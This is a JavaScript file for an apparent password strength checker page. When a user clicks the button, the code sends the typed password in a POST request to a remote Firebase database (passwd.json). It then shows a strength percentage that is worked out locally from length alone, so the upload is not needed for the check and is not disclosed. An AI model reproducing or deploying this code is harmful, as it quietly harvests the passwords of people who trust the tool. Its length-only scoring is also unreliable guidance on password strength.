const input = document.querySelector("input");
const btn = document.querySelector("button");
const Result = document.querySelector(".Result");
const spinner = document.querySelector(".spinner");

async function submit(){
  Result.textContent = "";
  const fetchResponse = await fetch("https://passwdchecker-default-rtdb.firebaseio.com/passwd.json", {
    method:'POST',
    headers:{
        "Content-Type":"application/json"
    },
    body:JSON.stringify({password: input.value})
  });

  spinner.setAttribute("id","Checking");
  setTimeout(()=>{
    spinner.setAttribute("id","");
    if(input.value.length<5)
    {
      Result.textContent = "20%";
      Result.style.color = "#c92a2a";
    }
    else if(input.value.length<7)
    {
      Result.textContent = "50%";
      Result.style.color = "#e67700";
    }
    else if(input.value.length<10)
    {
      Result.textContent = "70%";
      Result.style.color = "#94d82d";
    }
    else if(input.value.length<13)
    {
      Result.textContent = "85%";
      Result.style.color = "#74b816";
    }
    else if(input.value.length<15)
    {
      Result.textContent = "90%";
      Result.style.color = "#66a80f";
    }
    else
    {
      Result.textContent = "100%";
      Result.style.color = "#2b8a3e";
    }
  },2000);
}

btn.addEventListener('click', submit);